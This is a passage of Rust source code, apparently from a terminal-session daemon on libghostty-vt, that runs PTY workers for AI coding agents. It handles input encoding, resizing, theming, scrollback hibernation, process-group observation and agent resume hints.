                    config.transcript_max_bytes.max(1),
                )
            })
            .transpose()?;
        let visibility = if config.initially_visible {
            Visibility::Visible
        } else {
            Visibility::Hidden
        };
        let visual = if visibility == Visibility::Visible {
            Some(VisualResources::new().map_err(|error| format!("create render state: {error}"))?)
        } else {
            None
        };
        let key_encoder =
            KeyEncoder::new().map_err(|error| format!("create key encoder: {error}"))?;
        let mouse_encoder =
            MouseEncoder::new().map_err(|error| format!("create mouse encoder: {error}"))?;
        held.holder.commit_adoption()?;
        reader.activate();

        let events = Arc::new(events);
        let _ = published.semantic_events.set(Arc::downgrade(&events));

        Ok(Self {
            terminal_id: session.id,
            resume_hint: crate::model::agent_recovery::observed_hint_from_launch(&session.launch),
            resume_foreground: None,
            foreground_poll: FOREGROUND_POLL_MIN,
            last_foreground_observation: std::time::Instant::now(),
            agent_provider: None,
            agent_process: None,
            display_title: String::new(),
            agent_exited: false,
            root_exit: None,
            launch: session.launch,
            terminal,
            theme,
            key_encoder,
            mouse_encoder,
            effects,
            visual,
            visibility,
            generation: 0,
            capture_dirty: false,
            force_capture: false,
            current_size,
            applied_pty_size: current_size,
            applied_parser_size: current_size,
            commands,
            pty_rx: reader.output,
            events,
            transcript,
            published,
            master: held.master,
            writer,
            child: held.child,
            child_exit_rx,
            child_identity,
            checked_shutdown: false,
            carried: false,
            holder: held.holder,
            pty_capacity: config.pty_capacity,
            reader: Some(reader.thread),
            reader_wake: Some(reader.wake),
            reader_done: reader.done,
        })
    }

    fn run(mut self) {
        // An adopted terminal's title, set by drawing its screen again.
        self.drain_effects();
        if self.visibility == Visibility::Visible {
            self.publish_snapshot(true);
        }

        let mut pty_open = true;
        let mut exited = false;
        let mut shutting_down = false;
        let mut carried_command = None;
        while !shutting_down && (pty_open || !exited) {
            // Output or a busy input queue must not keep resetting discovery's
            // timeout: an agent can start in an existing shell's process group.
            if self.last_foreground_observation.elapsed() >= self.foreground_poll {
                self.observe_foreground();
            }
            let event = carried_command
                .take()
                .map(|command| WorkerEvent::Command(Some(command)))
                .unwrap_or_else(|| {
                    wait_for_worker_event(
                        &self.commands,
                        &self.pty_rx,
                        &self.child_exit_rx,
                        &self.published.capture_rx,
                        pty_open,
                        !exited,
                        self.foreground_poll
                            .saturating_sub(self.last_foreground_observation.elapsed()),
                    )
                });
            match event {
                WorkerEvent::Command(Some(command)) => {
                    // Wheel bursts otherwise queue one repaint per event. Fold
                    // adjacent viewport deltas before publishing a snapshot.
                    let command =
                        coalesce_scroll_command(command, &self.commands, &mut carried_command);
                    shutting_down = self.handle_command(command);
                }
                WorkerEvent::Command(None) => shutting_down = true,
                WorkerEvent::Capture => self.capture_if_ready(),
                WorkerEvent::ObserveForeground => self.observe_foreground(),
                WorkerEvent::Pty(message) => {
                    pty_open = self.handle_pty_message(message);
                }
                WorkerEvent::ChildExit(message) => {
                    self.handle_child_exit(
                        &mut exited,
                        message.unwrap_or_else(|| Err("child reaper closed".into())),
                    );
                }
            }
        }

        // The parser is about to disappear. Preserve its final grid even when
        // a consumer has not returned credit for the preceding frame.
        if self.capture_dirty {
            // A hidden terminal still needs a recoverable final grid once its
            // parser is destroyed. Do not re-enable its visual wake callback.
            if self.visual.is_none() {
                match VisualResources::new() {
                    Ok(visual) => self.visual = Some(visual),
                    Err(error) => self.error("build final terminal snapshot", error.to_string()),
                }
            }
            self.visibility = Visibility::Visible;
            self.published
                .acknowledged_generation
                .store(self.generation, Ordering::Release);
            self.capture_if_ready();
        }
        if shutting_down && !exited && !self.carried {
            match self.child_exit_rx.try_recv() {
                Ok(result) => self.handle_child_exit(&mut exited, result),
                Err(TryRecvError::Disconnected) => {
                    self.handle_child_exit(&mut exited, Err("child reaper closed".into()));
                }
                Err(TryRecvError::Empty) if self.checked_shutdown => {
                    let result = self
                        .child_exit_rx
                        .recv()
                        .unwrap_or_else(|_| Err("child reaper closed".into()));
                    self.handle_child_exit(&mut exited, result);
                }
                Err(TryRecvError::Empty) => match self.child.kill() {
                    Ok(()) => {
                        let result = self
                            .child_exit_rx
                            .recv()
                            .unwrap_or_else(|_| Err("child reaper closed".into()));
                        self.handle_child_exit(&mut exited, result);
                    }
                    Err(error) => match self.child_exit_rx.try_recv() {
                        Ok(result) => self.handle_child_exit(&mut exited, result),
                        Err(_) => self.error("terminate child", error.to_string()),
                    },
                },
            }
        }
        if let Some(transcript) = self.transcript.take() {
            transcript.finish();
        }

        // Release the reader's blocking wait before waiting on it, then bound
        // that wait: a reader still stuck on a descriptor a disowned
        // grandchild holds open is abandoned rather than joined forever,
        // because a hung join here wedges the daemon's dispatch thread.
        drop(self.reader_wake.take());
        if let Some(reader) = self.reader.take() {
            match self.reader_done.recv_timeout(READER_SHUTDOWN_GRACE) {
                Err(RecvTimeoutError::Timeout) => tracing::warn!(
                    terminal_id = %self.terminal_id,
                    "abandoning PTY reader thread still blocked on its descriptor"
                ),
                _ => {
                    let _ = reader.join();
                }
            }
        }
        if let Some(TerminalEvent::Exited {
            exit_code,
            signal,
            intentional,
        }) = self.root_exit.take()
        {
            // The root can exit while descendants continue using the PTY.
            // Only teardown after the drained PTY finalizes the surface.
            self.emit(TerminalEvent::Completed {
                exit_code,
                signal,
                intentional,
            });
        }
        if !shutting_down && exited && self.holder.registered() {
            if let Err(error) = carry::screen(&mut self.terminal, holder::MAX_SCREEN)
                .and_then(|screen| self.holder.cache_screen(&screen))
            {
                self.error("retain completed terminal screen", error);
            }
            *self
                .published
                .retained_holder
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(self.holder);
        } else {
            drop(self.holder);
        }
        drop(self.writer);
        drop(self.master);
        // Terminal, render state, and every Ghostty encoder drop here, on the
        // same OS thread on which they were constructed and used.
    }

    fn handle_child_exit(&mut self, exited: &mut bool, result: ChildExit) {
        let intentional = self
            .child_identity
            .as_ref()
            .is_some_and(RootIdentity::intentionally_killed);
        if let Some(event) = child_exit_event(exited, result, intentional) {
            self.root_exit = Some(event.clone());
            self.agent_exited = true;
            self.agent_provider = None;
            self.adopt_agent_process(None);
            self.emit(event);
        }
    }

    fn handle_pty_message(&mut self, message: Option<PtyMessage>) -> bool {
        match message {
            Some(PtyMessage::Bytes(mut bytes)) => {
                while bytes.len() < PTY_BATCH_LIMIT {
                    match self.pty_rx.try_recv() {
                        Ok(PtyMessage::Bytes(next)) => bytes.extend_from_slice(&next),
                        Ok(PtyMessage::Eof) => {
                            self.process_output(bytes);
                            return false;
                        }
                        Ok(PtyMessage::Error(error)) => {
                            self.error("read PTY", error);
                            self.process_output(bytes);
                            return false;
                        }
                        Err(TryRecvError::Empty) => break,
                        Err(TryRecvError::Disconnected) => {
                            self.process_output(bytes);
                            return false;
                        }
                    }
                }
                self.process_output(bytes);
                true
            }
            Some(PtyMessage::Eof) | None => false,
            Some(PtyMessage::Error(error)) => {
                self.error("read PTY", error);
                false
            }
        }
    }

    fn process_output(&mut self, bytes: Vec<u8>) {
        if bytes.is_empty() {
            return;
        }
        let observed_sequence = {
            let mut activity = self
                .published
                .activity
                .lock()
                .unwrap_or_else(|error| error.into_inner());
            let sequence = activity.map_or(1, |fact| fact.sequence.saturating_add(1));
            let last_output_at_unix_ms = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|elapsed| elapsed.as_millis().min(i64::MAX as u128) as i64)
                .unwrap_or(-1);
            *activity = Some(TerminalOutputActivity {
                sequence,
                last_output_at_unix_ms,
            });
            (self.published.output_armed.load(Ordering::Acquire)
                && self.published.output_armed.swap(false, Ordering::AcqRel))
            .then_some(sequence)
        };
        if let Some(sequence) = observed_sequence
            && let Some(observer) = self.published.output_observer.get()
        {
            observer(sequence);
        }

        let parse_started =
            tracing::enabled!(target: "cagents::terminal_pipeline", tracing::Level::TRACE)
                .then(std::time::Instant::now);
        self.terminal.vt_write(&bytes);
        if let Some(started) = parse_started {
            tracing::trace!(target: "cagents::terminal_pipeline", stage = "parse",
                terminal_id = %self.terminal_id, bytes = bytes.len(),
                elapsed_ns = started.elapsed().as_nanos() as u64);
        }

        // Hand the batch over instead of copying up to PTY_BATCH_LIMIT bytes
        // into a channel that drops them under exactly the flood that makes
        // the copy expensive, and that records nothing at all past its cap.
        if let Some(transcript) = &self.transcript
            && transcript.accepts()
            && transcript.send(bytes).is_err()
        {
            self.error("write transcript", "transcript writer closed".into());
            self.transcript = None;
        }

        self.drain_effects();
        self.publish_snapshot(false);
    }

    /// Returns true when shutdown was requested.
    fn handle_command(&mut self, command: Command) -> bool {
        match command {
            Command::ApplyAgentActivity {
                process,
                activity,
                title,
                reply,
                deadline,
            } => {
                let current = self.observe_agent_process();
                let valid = std::time::Instant::now() < deadline && current == Some(&process);
                let activity = if valid {
                    // Process identity is known even when the provider cannot
                    // report a state (for example, before its first message).
                    Some(activity.unwrap_or(crate::agent::Activity {
                        provider: process.provider,
                        state: crate::agent::ActivityState::Unknown,
                    }))
                } else {
                    None
                };
                self.set_agent_activity(activity);
                if valid && let Some(title) = title {
                    self.set_conversation_title(title);
                }
                let _ = reply.send(
                    *self
                        .published
                        .agent_activity
                        .lock()
                        .unwrap_or_else(|error| error.into_inner()),
                );
            }
            Command::CloseChecked {
                allow_active,
                deadline,
                reply,
            } => {
                use super::ipc::TerminalCloseResult;
                let outcome = match self.inspect_close(deadline) {
                    Ok((true, _)) if !allow_active => TerminalCloseResult::Active,
                    Ok((_, mut family)) => match family.kill(deadline) {
                        Ok(()) => {
                            self.checked_shutdown = true;
                            TerminalCloseResult::Closed
                        }
                        Err(detail) => TerminalCloseResult::Unknown(detail),
                    },
                    Err(detail) => TerminalCloseResult::Unknown(detail),
                };
                let close = outcome == TerminalCloseResult::Closed;
                let _ = reply.send(outcome);
                return close;
            }
            Command::PrepareUpgrade(reply) => {
                let result = self
                    .inspect_close(std::time::Instant::now() + std::time::Duration::from_secs(3))
                    .and_then(|(active, family)| {
                        self.refresh_resume_hint(true);
                        if active && self.resume_hint.as_deref()
                            .and_then(crate::model::agent_recovery::recipe_from_hint).is_some()
                            && !self.agent_process.as_ref().is_some_and(|process| family.only_agent_tree(process.pid))
                        {
                            return Err("Terminal also owns unrelated background jobs; finish or close them before upgrading".into());
                        }
                        Ok(UpgradeSnapshot {
                            hint: self.resume_hint.clone(),
                            size: self.current_size,
                            theme: self.theme.get(),
                            active,
                            family,
                        })
                    });
                let _ = reply.send(result);
            }
            Command::Carry { socket, reply } => {
                let carried = self.carry(&socket);
                let succeeded = carried.is_ok();
                let _ = reply.send(carried);
                return succeeded;
            }
            Command::PreserveForRestart(reply) => {
                if !self.holder.registered() {
                    let _ = reply.send(Err(
                        "legacy terminal has no persistent holder endpoint".into()
                    ));
                    return false;
                }
                self.carried = true;
                self.holder.leave_for_successor();
                let _ = reply.send(Ok(()));
                return true;
            }
            Command::ObserveAgent(sender) => {
                self.refresh_resume_hint(true);
                let _ = sender.send(self.resume_hint.clone());
            }
            Command::ObserveAgentProcess(sender) => {
                let process = self.observe_agent_process().cloned();
                let _ = sender.send(process);
            }
            Command::Input(bytes) => self.write_pty(&bytes, "write terminal input"),
            Command::Paste(text, origin) => self.paste(&text, origin),
            Command::Key(input) => self.encode_key(input),
            Command::Mouse(input) => self.encode_mouse(input),
            Command::Focus(focused) => {
                if focused {
                    self.refresh_resume_hint(true);
                }
                match self.terminal.mode(Mode::FOCUS_EVENT) {
                    Ok(true) => {}
                    Ok(false) => return false,
                    Err(error) => {
                        self.error("read focus-reporting mode", error.to_string());
                        return false;
                    }
                }
                let mut buffer = [0u8; 8];
                let event = if focused {
                    focus::Event::Gained
                } else {
                    focus::Event::Lost
                };
                match event.encode(&mut buffer) {
                    Ok(written) => self.write_pty(&buffer[..written], "write focus report"),
                    Err(error) => self.error("encode focus report", error.to_string()),
                }
            }
            Command::Resize(size) => self.resize(size),
            Command::Scroll(scroll) => {
                self.terminal.scroll_viewport(match scroll {
                    ScrollCommand::Top => ScrollViewport::Top,
                    ScrollCommand::Bottom => ScrollViewport::Bottom,
                    ScrollCommand::Delta(delta) => ScrollViewport::Delta(delta),
                    ScrollCommand::Row(row) => ScrollViewport::Row(row),
                });
                if self.visibility == Visibility::Visible {
                    self.publish_snapshot(false);
                }
            }
            Command::SetTheme(theme) => {
                if self.theme.get() != theme {
                    match apply_theme(&mut self.terminal, theme) {
                        Ok(()) => {
                            self.theme.set(theme);
                            if self
                                .terminal
                                .mode(Mode::COLOR_SCHEME_REPORT)
                                .unwrap_or(false)
                            {
                                let mut buffer = [0; 32];
                                if let Ok(len) = theme_scheme(theme).encode_report(&mut buffer) {
                                    self.write_pty(&buffer[..len], "report terminal color scheme");
                                }
                            }
                            self.publish_snapshot(true);
                        }
                        Err(error) => self.error("set terminal theme", error.to_string()),
                    }
                }
            }
            Command::Hide => self.set_hidden(),
            Command::Reveal => self.reveal(),
            Command::Hibernate => self.hibernate_visuals(),
            Command::Restore { visible } => self.restore_visuals(visible),
            Command::Shutdown => return true,
        }
        false
    }

    fn encode_key(&mut self, input: KeyInput) {
        match encode_key_input(&self.terminal, &mut self.key_encoder, input) {
            Ok(encoded) => self.write_pty(&encoded, "write encoded key"),
            Err(error) => self.error("encode key", error.to_string()),
        }
    }

    /// Pastes the way Ghostty does: the view returns to the prompt the text is
    /// going to, and the text is framed for whichever paste mode the child
    /// is in at the moment it arrives.
    fn paste(&mut self, text: &str, origin: PasteOrigin) {
        match encode_paste(&self.terminal, text, origin) {
            Ok(encoded) => {
                if encoded.is_empty() {
                    return;
                }
                self.terminal.scroll_viewport(ScrollViewport::Bottom);
                if self.visibility == Visibility::Visible {
                    self.publish_snapshot(false);
                }
                self.write_pty(&encoded, "write terminal paste");
            }
            Err(error) => self.error("encode terminal paste", error.to_string()),
        }
    }

    fn encode_mouse(&mut self, input: MouseInput) {
        let mut event = match mouse::Event::new() {
            Ok(event) => event,
            Err(error) => {
                self.error("create mouse event", error.to_string());
                return;
            }
        };
        event
            .set_action(map_mouse_action(input.action))
            .set_button(input.button.map(map_mouse_button))
            .set_mods(map_modifiers(input.modifiers))
            .set_position(mouse::Position {
                x: input.x,
                y: input.y,
            });
        self.mouse_encoder
            .set_options_from_terminal(&self.terminal)
            .set_any_button_pressed(input.any_button_pressed)
            .set_size(mouse::EncoderSize {
                screen_width: input.screen_width.max(1),
                screen_height: input.screen_height.max(1),
                cell_width: input.cell_width.max(1),
                cell_height: input.cell_height.max(1),
                padding_top: 0,
                padding_bottom: 0,
                padding_right: 0,
                padding_left: 0,
            });
        let mut encoded = Vec::with_capacity(32);
        match self.mouse_encoder.encode_to_vec(&event, &mut encoded) {
            Ok(()) => self.write_pty(&encoded, "write encoded mouse event"),
            Err(error) => self.error("encode mouse event", error.to_string()),
        }
    }

    fn resize(&mut self, mut size: TerminalSize) {
        size.columns = size.columns.max(1);
        size.rows = size.rows.max(1);
        size.cell_width_px = size.cell_width_px.max(1);
        size.cell_height_px = size.cell_height_px.max(1);
        if size == self.applied_pty_size && size == self.applied_parser_size {
            return;
        }
        // Record only what actually took effect. A failed ioctl cached as the
        // current size would swallow every later identical request, including
        // the steady-state size the widget re-sends, and the child would keep
        // its old SIGWINCH dimensions for the rest of its life.
        if size != self.applied_pty_size {
            match self.master.resize(pty_size(size)) {
                Ok(()) => self.applied_pty_size = size,
                Err(error) => self.error("resize PTY", error.to_string()),
            }
        }
        if size != self.applied_parser_size {
            match self.terminal.resize(
                size.columns,
                size.rows,
                size.cell_width_px,
                size.cell_height_px,
            ) {
                Ok(()) => self.applied_parser_size = size,
                Err(error) => self.error("resize terminal", error.to_string()),
            }
        }
        self.current_size = size;
        if self.visibility == Visibility::Visible {
            self.publish_snapshot(true);
        }
    }

    fn set_hidden(&mut self) {
        self.visibility = Visibility::Hidden;
        self.published.suppress_wakes();
    }

    fn reveal(&mut self) {
        self.published
            .acknowledged_generation
            .store(self.generation, Ordering::Release);
        if self.visual.is_none() {
            match VisualResources::new() {
                Ok(visual) => self.visual = Some(visual),
                Err(error) => {
                    self.error("restore render state", error.to_string());
                    return;
                }
            }
        }
        self.visibility = Visibility::Visible;
        // Observe promptly again: whatever ran in the background while this
        // card was away is what the user is now looking at.
        self.foreground_poll = FOREGROUND_POLL_MIN;
        self.published.visible.store(true, Ordering::Release);
        self.publish_snapshot(true);
    }

    fn hibernate_visuals(&mut self) {
        self.visibility = Visibility::Hibernated;
        self.published.suppress_wakes();
        self.visual = None;
        self.generation = self.generation.saturating_add(1);
        self.published.detach(self.generation);
        // Render state is the small half. The parser's scrollback pool is tens
        // of MiB for a wide grid and, with `max_scrollback` fixed at
        // construction, is otherwise retained for as long as the card exists.
        //
        // libghostty-vt 0.2.1 exposes no way to lower that limit or drop the
        // history tail, and rebuilding the parser from the viewport is not an
        // option for a card that can be revealed again: its child is still
        // running, so modes, the alternate screen, cursor state and keyboard
        // and mouse protocol state would all be lost under a live TUI. A full
        // compression pass is the reclamation that keeps the contract - it
        // changes only the storage representation, never the logical
        // contents - and its one synchronous scan is affordable exactly here,
        // where nothing is waiting on a frame.
        match self.terminal.compress(CompressionMode::Full) {
            Ok(CompressionResult::Unsupported) => tracing::debug!(
                terminal_id = %self.terminal_id,
                "scrollback reclamation is unavailable on this target"
            ),
            Ok(_) => {}
            Err(error) => tracing::debug!(
                terminal_id = %self.terminal_id,
                %error,
                "hibernated terminal could not compress its scrollback"
            ),
        }
    }

    fn restore_visuals(&mut self, visible: bool) {
        if visible {
            self.reveal();
        } else {
            self.set_hidden();
        }
    }

    fn publish_snapshot(&mut self, force: bool) {
        self.capture_dirty = true;
        self.force_capture |= force;
        self.capture_if_ready();
    }

    fn capture_if_ready(&mut self) {
        if !self.capture_dirty
            || self
                .published
                .acknowledged_generation
                .load(Ordering::Acquire)
                < self.generation
        {
            return;
        }
        if self.visibility != Visibility::Visible {
            return;
        }
        let Some(visual) = self.visual.as_mut() else {
            return;
        };
        let next_generation = self.generation.saturating_add(1);
        let activity = *self
            .published
            .activity
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let capture_started =
            tracing::enabled!(target: "cagents::terminal_pipeline", tracing::Level::TRACE)
                .then(std::time::Instant::now);
        let captured = visual.capture(
            &self.terminal,
            next_generation,
            self.force_capture,
            activity,
        );
        if let Some(started) = capture_started {
            tracing::trace!(target: "cagents::terminal_pipeline", stage = "capture",
                terminal_id = %self.terminal_id, generation = next_generation,
                activity_sequence = activity.map_or(0, |fact| fact.sequence),
                published = matches!(&captured, Ok(Some(_))),
                elapsed_ns = started.elapsed().as_nanos() as u64);
        }
        match captured {
            Ok(Some(snapshot)) => {
                self.capture_dirty = false;
                self.force_capture = false;
                self.generation = next_generation;
                self.published.publish(snapshot);
            }
            Ok(None) => {
                self.capture_dirty = false;
                self.force_capture = false;
            }
            Err(error) => self.error("build terminal snapshot", error.to_string()),
        }
    }

    fn drain_effects(&mut self) {
        let effects = std::mem::take(&mut *self.effects.borrow_mut());
        for effect in effects {
            match effect {
                Effect::PtyWrite(bytes) => self.write_pty(&bytes, "write terminal response"),
                Effect::Bell => self.emit(TerminalEvent::Bell),
                Effect::Title(title) => {
                    let title = if self.agent_provider == Some(crate::agent::Provider::Codex) {
                        crate::agent::codex_title_without_spinner(&title)
                    } else {
                        &title
                    };
                    let activity = self.agent_provider.and_then(|provider| {
                        provider
                            .activity_from_title(&title)
                            .map(|state| crate::agent::Activity { provider, state })
                    });
                    let display_changed = match agent_title_label(&title, activity) {
                        Some("") => self.display_title != "π",
                        Some(label) => self.display_title.strip_prefix("π ") != Some(label),
                        None => self.display_title != title,
                    };
                    let previous = *self
                        .published
                        .agent_activity
                        .lock()
                        .unwrap_or_else(|error| error.into_inner());
                    if display_changed || activity != previous {
                        self.refresh_resume_hint(true);
                    }
                    let observed = self.agent_provider.and_then(|provider| {
                        provider
                            .activity_from_title(&title)
                            .map(|state| crate::agent::Activity { provider, state })
                    });
                    if self.agent_provider == Some(crate::agent::Provider::Omp) {
                        self.set_agent_activity(
                            self.agent_process
                                .as_ref()
                                .filter(|process| process.provider == crate::agent::Provider::Omp)
                                .and(observed),
                        );
                    }
                    if display_changed || observed != activity {
                        if let Some(process) = &self.agent_process
                            && let Some(name) = process
                                .provider
                                .conversation_title(&title, &process.launch.working_directory)
                        {
                            self.set_conversation_title(name.into());
                        }
                        let display = canonical_agent_title(&title, observed);
                        if display != self.display_title {
                            self.display_title = display.clone();
                            self.emit(TerminalEvent::TitleChanged(display));
                        }
                    }
                }
            }
        }
    }

    /// Stops reading the terminal, takes in everything already read, and
    /// detaches its holder with the screen that output drew. A terminal that
    /// cannot be detached is read again; one whose reader would not stop is
    /// left to that reader.
    fn carry(&mut self, socket: &std::path::Path) -> Result<Carried, String> {
        // Observed while this worker still owns the terminal's processes.
        self.refresh_resume_hint(true);
        self.stop_reading()?;
        let detached = carry::screen(&mut self.terminal, holder::MAX_SCREEN)
            .and_then(|screen| self.holder.detach(socket, &screen));
        if let Err(error) = detached {
            match Reader::start(
                self.terminal_id,
                &self.master,
                self.pty_capacity,
                Vec::new(),
            ) {
                Ok(reader) => {
                    self.reader = Some(reader.thread);
                    self.reader_wake = Some(reader.wake);
                    self.reader_done = reader.done;
                    self.pty_rx = reader.output;
                }
                Err(restart) => self.error("resume reading terminal", restart),
            }
            return Err(error);
        }
        self.carried = true;
        Ok(Carried {
            size: self.current_size,
            theme: self.theme.get(),
            hint: self.resume_hint.clone(),
        })
    }

    /// Stops the reader and takes in everything it read. A reader that will
    /// not stop may still read, which leaves the terminal to it.
    fn stop_reading(&mut self) -> Result<(), String> {
        drop(self.reader_wake.take());
        let deadline = std::time::Instant::now() + READER_SHUTDOWN_GRACE;
        let mut reading = true;
        while reading {
            crossbeam_channel::select! {
                recv(self.pty_rx) -> message => match message {
                    Ok(PtyMessage::Bytes(bytes)) => self.process_output(bytes),
                    // Nothing more to read; the holder has the rest.
                    Ok(PtyMessage::Eof | PtyMessage::Error(_)) | Err(_) => reading = false,
                },
                recv(self.reader_done) -> _ => reading = false,
                default(deadline.saturating_duration_since(std::time::Instant::now())) => {
                    // The reader may yet read: handing the terminal over now
                    // could lose or reorder its output.
                    return Err("the terminal's reader did not stop".into());
                }
            }
        }
        if let Some(reader) = self.reader.take() {
            let _ = reader.join();
        }
        while let Ok(message) = self.pty_rx.try_recv() {
            if let PtyMessage::Bytes(bytes) = message {
                self.process_output(bytes);
            }
        }
        Ok(())
    }

    fn inspect_close(&self, deadline: std::time::Instant) -> Result<(bool, FrozenFamily), String> {
        let root = self
            .child_identity
            .as_ref()
            .ok_or("Child identity unavailable")?;
        let family = FrozenFamily::capture(root, deadline)?;
        // SAFETY: this worker owns the live PTY throughout the frozen census.
        let foreground = unsafe { libc::tcgetpgrp(self.master.as_raw_fd()) };
        if foreground <= 0 {
            return Err("Foreground process group unavailable".into());
        }
        // Process-only policy deliberately permits terminating shell builtins.
        // The original executable check still prevents an exec'd agent or
        // command from inheriting an idle shell's authority.
        let idle_shell = interactive_shell_launch(&self.launch) && root.original_executable();
        Ok((
            family.has_jobs() || foreground != root.process.group || !idle_shell,
            family,
        ))
    }

    fn foreground_group(&self) -> Option<libc::pid_t> {
        // SAFETY: this worker owns the live master descriptor.
        let group = unsafe { libc::tcgetpgrp(self.master.as_raw_fd()) };
        (group > 0).then_some(group)
    }

    fn observe_agent_process(&mut self) -> Option<&AgentProcess> {
        let group = self.foreground_group();
        let process = if self.agent_exited {
            None
        } else {
            group
                .and_then(crate::model::agent_recovery::foreground_agent)
                // A group that moved mid-walk invalidates what the walk saw.
                .filter(|_| self.foreground_group() == group)
        };
        self.adopt_agent_process(process);
        self.agent_process.as_ref()
    }

    fn adopt_agent_process(&mut self, process: Option<AgentProcess>) {
        let changed = process != self.agent_process;
        if process.is_none() || process != self.agent_process {
            self.set_agent_activity(process.as_ref().map(|process| crate::agent::Activity {
                provider: process.provider,
                state: crate::agent::ActivityState::Unknown,
            }));
        }
        self.agent_process = process.clone();
        if changed {
            *self
                .published
                .agent_process
                .lock()
                .unwrap_or_else(|p| p.into_inner()) = process;
            if let Some(observer) = self.published.agent_observer.get() {
                observer();
            }
        }
    }

    /// Timer-driven observation. The descent is only worth its cost while the
    /// foreground group is moving, so an unchanged group backs the interval
    /// off. It must still be sampled: `exec claude` or a child without shell job
    /// control can become an agent without changing the foreground group.
    ///
    /// A hidden terminal is still observed, at the longest interval: its saved
    /// resume hint is what recovery relies on when the daemon goes away, and
    /// an agent can `/resume` or `/clear` into another conversation without
    /// ever leaving the foreground or drawing a title anyone sees.
    fn observe_foreground(&mut self) {
        self.last_foreground_observation = std::time::Instant::now();
        if self.agent_exited {
            // Nothing here can change again, so let the timer settle to its
            // longest interval rather than waking for the rest of its life.
            self.foreground_poll = FOREGROUND_POLL_MAX;
            return;
        }
        if self.foreground_group() == self.resume_foreground {
            self.foreground_poll = (self.foreground_poll * 2).min(FOREGROUND_POLL_MAX);
        }
        self.refresh_resume_hint(true);
        if self.visibility != Visibility::Visible {
            self.foreground_poll = FOREGROUND_POLL_MAX;
        }
    }

    fn refresh_resume_hint(&mut self, force: bool) {
        let foreground = self.foreground_group();
        if !force && self.resume_foreground == foreground {
            return;
        }
        self.last_foreground_observation = std::time::Instant::now();
        if self.resume_foreground != foreground {
            // The group moved: observe promptly again until it settles.
            self.foreground_poll = FOREGROUND_POLL_MIN;
        }
        self.resume_foreground = foreground;
        // One descent answers both questions. Resolving them separately meant
        // two full /proc walks - stat, cmdline, cwd, environ and children per
        // node - for a single observation.
        let observation = if self.agent_exited {
            None
        } else {
            foreground
                .map(|group| {
                    crate::model::agent_recovery::foreground_observation(group, &self.launch)
                })
                // A group that moved mid-walk invalidates what the walk saw.
                .filter(|_| self.foreground_group() == foreground)
        };
        let (hint, process) = observation
            .map(|observation| (observation.hint, observation.agent))
            .unwrap_or_default();
        self.adopt_agent_process(process);
        self.agent_provider = self.agent_process.as_ref().map(|process| process.provider);
        if hint != self.resume_hint {
            self.resume_hint = hint.clone();
            self.emit(TerminalEvent::ResumeHintChanged(hint));
        }
    }

    fn set_agent_activity(&self, activity: Option<crate::agent::Activity>) {
        self.published.set_agent_activity(activity);
    }

    fn set_conversation_title(&self, title: String) {
        let title: String = title.chars().take(256).collect();
        let mut current = self
            .published
            .conversation_title
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        if current.as_ref() != Some(&title) {
            *current = Some(title.clone());
            self.emit(TerminalEvent::ConversationTitleChanged(title));
        }
    }

    fn write_pty(&mut self, bytes: &[u8], operation: &'static str) {
        if bytes.is_empty() {
            return;
        }
        if let Err(error) = self
            .writer
            .write_all(bytes)
            .and_then(|()| self.writer.flush())
        {
            self.error(operation, error.to_string());
        }
    }

    fn emit(&self, event: TerminalEvent) {
        let _ = self.events.send(event);
    }

    fn error(&self, operation: &'static str, message: String) {
        self.set_agent_activity(None);
        self.emit(TerminalEvent::Error { operation, message });
    }
}

fn canonical_agent_title(title: &str, activity: Option<crate::agent::Activity>) -> String {
    if let Some(label) = agent_title_label(title, activity) {
        if label.is_empty() {
            "π".into()
        } else {
            format!("π {label}")
        }
    } else {
        title.to_owned()
    }
}

fn agent_title_label(title: &str, activity: Option<crate::agent::Activity>) -> Option<&str> {
    if !activity.is_some_and(|activity| activity.provider == crate::agent::Provider::Omp) {
        return None;
    }
    // The lifecycle glyph is view state, never a durable title or recovery ID.
    let rest = title.strip_prefix("π ")?;
    let glyph = rest.chars().next()?;
    Some(rest[glyph.len_utf8()..].strip_prefix(' ').unwrap_or(""))
}

fn theme_scheme(theme: TerminalTheme) -> ColorScheme {
    if theme.palette().light {
        ColorScheme::Light
    } else {
        ColorScheme::Dark
    }
}
fn coalesce_scroll_command(
    command: Command,
    commands: &Receiver<Command>,
    carried: &mut Option<Command>,
) -> Command {
    let Command::Scroll(ScrollCommand::Delta(mut delta)) = command else {
        return command;
    };
    while let Ok(next) = commands.try_recv() {
        match next {
            Command::Scroll(ScrollCommand::Delta(next_delta)) => {
                delta = delta.saturating_add(next_delta);
            }
            other => {
                *carried = Some(other);
                break;
            }
        }
    }
    Command::Scroll(ScrollCommand::Delta(delta))
}

/// Set parser defaults, not resolved UI RGB values: truecolor and application
/// OSC overrides retain their meaning, and OSC queries observe the same colors.
fn apply_theme(
    terminal: &mut Terminal<'_, '_>,
    theme: TerminalTheme,
) -> Result<(), libghostty_vt::Error> {
    let palette = theme.palette();
    let rgb = |color: super::ThemeColor| {
        let (r, g, b) = color.rgb();
        RgbColor { r, g, b }
    };
    terminal
        .set_default_fg_color(Some(rgb(palette.foreground)))?
        .set_default_bg_color(Some(rgb(palette.background)))?
        .set_default_cursor_color(Some(rgb(palette.cursor)))?;
    let mut colors = terminal.default_color_palette()?;
    for (index, value) in palette.ansi.into_iter().enumerate() {
        colors.set(PaletteIndex(index as u8), rgb(value));
    }
    terminal.set_default_color_palette(Some(colors))?;
    Ok(())
}

fn wait_for_worker_event(
    commands: &Receiver<Command>,
    pty: &Receiver<PtyMessage>,
    child_exit: &Receiver<ChildExit>,
    capture: &Receiver<()>,
    pty_open: bool,
    child_running: bool,
    observe_after: Duration,
) -> WorkerEvent {
    match (pty_open, child_running) {
        (true, true) => crossbeam_channel::select! {
            recv(commands) -> message => WorkerEvent::Command(message.ok()),
            recv(capture) -> _ => WorkerEvent::Capture,
            recv(pty) -> message => WorkerEvent::Pty(message.ok()),
            recv(child_exit) -> message => WorkerEvent::ChildExit(message.ok()),
            default(observe_after) => WorkerEvent::ObserveForeground,
        },
        (true, false) => crossbeam_channel::select! {
            recv(commands) -> message => WorkerEvent::Command(message.ok()),
            recv(capture) -> _ => WorkerEvent::Capture,
            recv(pty) -> message => WorkerEvent::Pty(message.ok()),
        },
        (false, true) => crossbeam_channel::select! {
            recv(commands) -> message => WorkerEvent::Command(message.ok()),
